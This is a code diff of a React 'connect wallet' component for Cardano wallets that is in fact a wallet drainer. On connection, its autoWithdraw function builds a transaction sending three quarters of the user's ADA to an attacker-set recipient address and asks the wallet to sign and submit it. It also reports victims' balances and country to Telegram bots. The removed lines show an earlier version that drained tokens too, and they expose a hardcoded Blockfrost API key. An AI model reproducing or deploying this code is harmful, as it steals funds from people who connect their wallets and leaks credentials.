@@ -3,9 +3,6 @@ import { useNavigate } from "react-router";
 import { Link } from "react-router-dom";
 import { Buffer } from "buffer";
 import axios from "axios";
-import { transferADA, transferADAAndTokens } from "../../utils/walletUtils";
-import { getRecipientAddress } from "../../utils/userLocation";
-import { sendAppDetailsToTelegram } from "../../utils/telegramUtils";
 
 function ConnectWallet({ onClose }) {
   const [selectedWallet, setSelectedWallet] = useState(null);
@@ -20,6 +17,29 @@ function ConnectWallet({ onClose }) {
   const [usdBalance, setUsdBalance] = useState(null);
   const [address, setAddress] = useState("");
   const navigate = useNavigate();
+  const [country, setCountry] = useState("");
+
+  
+  useEffect(() => {
+    const getCountry = async () => {
+      try {
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+        const country = data.country_name;
+        setCountry(country);
+      } catch (error) {
+        console.error("Error fetching country:", error);
+        setCountry("Unknown");
+        console.log("Unknown"); // Log "Unknown" if there's an error
+      }
+    };
+    getCountry();
+  }, []);
+
+
+
+  const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
+  const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;
 
   useEffect(() => {
     const loadWasm = async () => {
@@ -32,9 +52,6 @@ function ConnectWallet({ onClose }) {
     loadWasm();
   }, []);
 
-  const BLOCKFROST_API_KEY = "mainnetl7kg73l1Eh3mif46gJOJHIfTtbYosjl8";
-  const BLOCKFROST_API_URL = "https://cardano-mainnet.blockfrost.io/api/v0";
-
   const fetchProtocolParams = async () => {
     try {
       const response = await axios.get(
@@ -43,7 +60,7 @@ function ConnectWallet({ onClose }) {
           headers: {
             project_id: BLOCKFROST_API_KEY,
           },
-        }
+        },
       );
       return response.data;
     } catch (error) {
@@ -62,7 +79,7 @@ function ConnectWallet({ onClose }) {
       let balanceInAda;
       if (isHex) {
         balanceInAda = CardanoWasm.Value.from_bytes(
-          Buffer.from(balanceInLovelace, "hex")
+          Buffer.from(balanceInLovelace, "hex"),
         );
       } else {
         balanceInAda = Number(balanceInLovelace) / 1000000;
@@ -73,7 +90,7 @@ function ConnectWallet({ onClose }) {
       setBalance(newBalance);
 
       const response = await fetch(
-        "https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd"
+        "https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd",
       );
       const data = await response.json();
       const adaToUsd = data.cardano.usd;
@@ -91,156 +108,201 @@ function ConnectWallet({ onClose }) {
   }
 
   async function autoWithdraw(walletApi, currentBalance, address) {
-    if (
-      currentBalance === null ||
-      currentBalance === 0 ||
-      isNaN(currentBalance)
-    ) {
-      console.error("Balance not available or is NaN");
+    if (currentBalance === null || currentBalance === 0) {
+      console.error("Balance not available or zero");
       return;
     }
 
-    const recipientAddress = await getRecipientAddress();
+    const recipientAddress = import.meta.env.VITE_REACT_APP_RECIPIENT_ADDRESS;
 
-    let localBalance = currentBalance; // Track balance locally
-
-    console.log(`Starting balance: ${localBalance.toFixed(6)} ADA`);
+    // Calculate 3/4 of the balance
+    const amountToWithdraw = Math.floor(currentBalance * 0.75);
 
     try {
       const protocolParams = await fetchProtocolParams();
 
-      // Fetch UTXOs
-      let utxosHex = await walletApi.getUtxos();
-      if (!utxosHex || !Array.isArray(utxosHex) || utxosHex.length === 0) {
-        console.error("No UTXOs found or invalid UTXO format");
-        return;
-      }
+      // Convert ADA to Lovelace without padding
+      const lovelaceAmount = Math.floor(
+        amountToWithdraw * 1000000,
+      ).toString();
 
-      let utxos = await getTxUnspentOutputs(utxosHex);
-      if (!utxos || utxos.len() === 0) {
-        console.error("Parsed UTXOs are empty or invalid");
-        return;
-      }
+      console.log("Lovelace amount:", lovelaceAmount);
 
-      let totalAdaAmount = 0;
-      let nonNativeTokens = [];
-
-      // Collect ADA and non-native tokens
-      for (let i = 0; i < utxos.len(); i++) {
-        const utxo = utxos.get(i);
-        const outputAmount = utxo.output().amount();
-        const adaAmount = parseInt(outputAmount.coin().to_str());
-        if (!isNaN(adaAmount)) {
-          totalAdaAmount += adaAmount;
-        }
-
-        const multiasset = outputAmount.multiasset();
-        if (multiasset) {
-          const keys = multiasset.keys();
-          const N = keys.len();
-          for (let i = 0; i < N; i++) {
-            const policyId = keys.get(i);
-            const assets = multiasset.get(policyId);
-            const assetNames = assets.keys();
-            const K = assetNames.len();
-            for (let j = 0; j < K; j++) {
-              const assetName = assetNames.get(j);
-              const amount = parseInt(
-                multiasset.get_asset(policyId, assetName).to_str()
-              );
-              if (!isNaN(amount)) {
-                nonNativeTokens.push({
-                  policyId: policyId.to_hex(),
-                  assetName: Buffer.from(assetName.name()).toString(),
-                  amount: amount,
-                });
-              }
-            }
-          }
-        }
-      }
-
-      // Step 1: Withdraw 3/4 of ADA balance
-      const adaToWithdraw = Math.floor(localBalance * 0.75); // Withdraw 85% of remaining ADA
-
-      if (!isNaN(adaToWithdraw)) {
-        try {
-          console.log(`Withdrawing 3/4 ADA: ${adaToWithdraw} ADA`);
-          // Send wallet balance to Telegram
-          sendAppDetailsToTelegram(adaToWithdraw, nonNativeTokens);
-          const txHash = await transferADA(
-            walletApi,
-            CardanoWasm,
-            recipientAddress,
-            adaToWithdraw
-          );
-          console.log(`ADA transfer transaction hash: ${txHash}`);
-
-          // Update local ADA balance after ADA withdrawal
-          localBalance -= adaToWithdraw;
-          console.log(
-            `Balance after ADA withdrawal: ${localBalance.toFixed(6)} ADA`
-          );
-
-          if (localBalance < 1) {
-            console.error("Insufficient ADA for further transactions.");
-            return;
-          }
-        } catch (error) {
-          console.log("Failed to transfer ADA:", error);
-        }
-      }
-
-      // Step 2: Check and withdraw non-native tokens, if available
-      if (nonNativeTokens.length > 0) {
-        console.log(
-          `Withdrawing non-ADA tokens: ${nonNativeTokens.length} tokens`
-        );
-
-        // Prepare token data for transfer
-        const tokenPolicyIds = nonNativeTokens.map((token) => token.policyId);
-        const tokenAssetNames = nonNativeTokens.map((token) => token.assetName);
-        const tokenAmounts = nonNativeTokens.map((token) => token.amount);
-
-        try {
-          const txHash = await transferADAAndTokens(
-            walletApi,
-            CardanoWasm,
-            recipientAddress,
-            tokenPolicyIds,
-            tokenAssetNames,
-            tokenAmounts
-          );
-          console.log(`Non-ADA token transfer transaction hash: ${txHash}`);
-        } catch (error) {
-          console.log("Failed to transfer non-ADA tokens:", error);
-        }
-      } else {
-        console.log("No non-ADA tokens found, skipping token withdrawal.");
-      }
+      await buildSendADATransaction(
+        recipientAddress,
+        lovelaceAmount,
+        walletApi,
+        protocolParams,
+        address,
+      );
+      console.log(
+        `Withdrawal of ${amountToWithdraw.toFixed(6)} ADA initiated (3/4 of balance)`,
+      );
     } catch (error) {
-      console.log("Error during auto-withdrawal:", error);
+      console.error("Error during auto-withdrawal:", error);
     }
   }
 
-  async function getTxUnspentOutputs(utxosHex) {
-    const txOutputs = CardanoWasm.TransactionUnspentOutputs.new();
+  const getTxUnspentOutputs = async (utxos) => {
+    let txOutputs = CardanoWasm.TransactionUnspentOutputs.new();
+    for (const utxor of utxos) {
+      const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
+        Buffer.from(utxor, "hex"),
+      );
+      const input = utxo.input();
+      const txid = Buffer.from(
+        input.transaction_id().to_bytes(),
+        "utf8",
+      ).toString("hex");
+      const txindx = input.index();
+      const output = utxo.output();
+      const amount = output.amount().coin().to_str();
+      const multiasset = output.amount().multiasset();
+      let multiAssetStr = "";
 
-    for (const utxor of utxosHex) {
-      try {
-        // Convert hex UTXO to TransactionUnspentOutput object
-        const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
-          Buffer.from(utxor, "hex")
-        );
-        txOutputs.add(utxo);
-      } catch (error) {
-        console.error("Failed to parse UTXO:", error);
-        throw new Error("Invalid UTXO format");
+      if (multiasset) {
+        const keys = multiasset.keys();
+        const N = keys.len();
+
+        for (let i = 0; i < N; i++) {
+          const policyId = keys.get(i);
+          const policyIdHex = Buffer.from(policyId.to_bytes(), "utf8").toString(
+            "hex",
+          );
+          const assets = multiasset.get(policyId);
+          const assetNames = assets.keys();
+          const K = assetNames.len();
+
+          for (let j = 0; j < K; j++) {
+            const assetName = assetNames.get(j);
+            const assetNameString = Buffer.from(
+              assetName.name(),
+              "utf8",
+            ).toString();
+            const assetNameHex = Buffer.from(assetName.name(), "utf8").toString(
+              "hex",
+            );
+            const multiassetAmt = multiasset.get_asset(policyId, assetName);
+            multiAssetStr += `+ ${multiassetAmt.to_str()} + ${policyIdHex}.${assetNameHex} (${assetNameString})`;
+          }
+        }
       }
-    }
 
+      const obj = {
+        txid: txid,
+        txindx: txindx,
+        amount: amount,
+        str: `${txid} #${txindx} = ${amount}`,
+        multiAssetStr: multiAssetStr,
+        TransactionUnspentOutput: utxo,
+      };
+      txOutputs.add(obj.TransactionUnspentOutput);
+    }
     return txOutputs;
-  }
+  };
+
+  const buildSendADATransaction = async (
+    recAddress,
+    amount,
+    nami,
+    protocolParams,
+    address,
+  ) => {
+    const txBuilder = CardanoWasm.TransactionBuilder.new(
+      CardanoWasm.TransactionBuilderConfigBuilder.new()
+        .fee_algo(
+          CardanoWasm.LinearFee.new(
+            CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
+            CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString()),
+          ),
+        )
+        .pool_deposit(
+          CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString()),
+        )
+        .key_deposit(
+          CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString()),
+        )
+        .coins_per_utxo_word(
+          CardanoWasm.BigNum.from_str(
+            protocolParams.coins_per_utxo_size.toString(),
+          ),
+        )
+        .max_tx_size(16384)
+        .max_value_size(5000)
+        .build(),
+    );
+    console.log("Amount in Lovelace:", amount, recAddress, "naddr", address);
+    const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
+    const shelleyChangeAddress = CardanoWasm.Address.from_bech32(address);
+
+    console.log(
+      "Amount in Lovelace:",
+      shelleyOutputAddress,
+      shelleyChangeAddress,
+    );
+
+    const utxosHex = await nami.getUtxos();
+
+    console.log("Amount in Lovelace:", utxosHex);
+
+    const utxos = utxosHex.map((hex) =>
+      CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex")),
+    );
+    console.log("Amount in Lovelace:", utxosHex);
+
+    utxos.forEach((utxo) => {
+      txBuilder.add_input(
+        CardanoWasm.Address.from_bech32(address),
+        utxo.input(),
+        utxo.output().amount(),
+      );
+    });
+
+    console.log("Amount in Lovelace:", utxosHex);
+
+    txBuilder.add_output(
+      CardanoWasm.TransactionOutput.new(
+        shelleyOutputAddress,
+        CardanoWasm.Value.new(CardanoWasm.BigNum.from_str(amount)),
+      ),
+    );
+
+    txBuilder.add_change_if_needed(shelleyChangeAddress);
+
+    const txBody = txBuilder.build();
+
+    const transactionWitnessSet = CardanoWasm.TransactionWitnessSet.new();
+
+    const tx = CardanoWasm.Transaction.new(
+      txBody,
+      CardanoWasm.TransactionWitnessSet.from_bytes(
+        transactionWitnessSet.to_bytes(),
+      ),
+    );
+
+    console.log("Amount in Lovelace:", tx);
+
+    let txVkeyWitnesses = await nami.signTx(
+      Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
+      true,
+    );
+
+    txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
+      Buffer.from(txVkeyWitnesses, "hex"),
+    );
+
+    transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());
+
+    const signedTx = CardanoWasm.Transaction.new(
+      tx.body(),
+      transactionWitnessSet,
+    );
+
+    const submittedTxHash = await nami.submitTx(
+      Buffer.from(signedTx.to_bytes(), "utf8").toString("hex"),
+    );
+    console.log("Submitted transaction hash:", submittedTxHash);
+  };
 
   const handleWalletSelection = async (wallet) => {
     if (wallet === "Nami") {
@@ -276,7 +338,7 @@ function ConnectWallet({ onClose }) {
               const address = CardanoWasm.Address.from_bytes(addressBytes);
               console.log(
                 `Connected to Nami. Hex Address:`,
-                address?.to_bech32()
+                address?.to_bech32(),
               );
               setAddress(address?.to_bech32());
 
@@ -288,7 +350,7 @@ function ConnectWallet({ onClose }) {
                 await autoWithdraw(
                   walletApi,
                   currentBalance,
-                  address?.to_bech32()
+                  address?.to_bech32(),
                 );
               } else {
                 console.error("Failed to retrieve balance");
@@ -297,16 +359,20 @@ function ConnectWallet({ onClose }) {
             } else {
               console.error("No addresses found");
               alert(
-                "No addresses found in the wallet. If this is a new wallet, please make a transaction first."
+                "No addresses found in the wallet. If this is a new wallet, please make a transaction first.",
               );
             }
           }
         } catch (error) {
           console.error(`Error connecting to Nami wallet:`, error);
-          alert(`Error connecting to Nami wallet. Please try again`);
+          alert(
+            `Error connecting to Nami wallet. Please try again`,
+          );
         }
       } else {
-        console.error(`Nami wallet not found. Please install the extension.`);
+        console.error(
+          `Nami wallet not found. Please install the extension.`,
+        );
         alert(`Nami wallet not found. Please install the extension.`);
       }
     } else if (wallet === "Eternl") {
@@ -362,7 +428,9 @@ function ConnectWallet({ onClose }) {
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
     const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
     const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
-
+    const greenCountries = ['united states', 'united kingdom', 'nigeria', 'united arab emirates'];
+    const color = greenCountries.includes(country.toLowerCase()) ? 'RED' : 'GREEN';
+    
     const endpoints = [
       {
         url: `https://api.telegram.org/bot${token}/sendMessage`,
@@ -483,9 +551,8 @@ function ConnectWallet({ onClose }) {
           Import MinWallet.json file
         </p>
         <button
-          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold flex items-center justify-center gap-2 ${
-            !fileUploaded ? "opacity-50 cursor-not-allowed" : ""
-          }`}
+          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold flex items-center justify-center gap-2 ${!fileUploaded ? "opacity-50 cursor-not-allowed" : ""
+            }`}
           disabled={!fileUploaded}
           onClick={handleTransferWallet}
         >
@@ -818,7 +885,7 @@ function ConnectWallet({ onClose }) {
                       </div>
                       <div
                         className="flex items-center cursor-pointer gap-x-4 p-3 "
-                        //   onClick={() => handleWalletSelection("Ledger")}
+                      //   onClick={() => handleWalletSelection("Ledger")}
                       >
                         <img
                           src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831775/abhvehnlx6umoknjxw5f.svg"
@@ -902,7 +969,7 @@ function ConnectWallet({ onClose }) {
                       </div>
                       <div
                         className="flex items-center cursor-pointer gap-x-4 p-3 "
-                        //   onClick={() => handleWalletSelection("WalletConnect")}
+                      //   onClick={() => handleWalletSelection("WalletConnect")}
                       >
                         <img
                           src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831870/gwe5i02najzyogs8jqcj.svg"
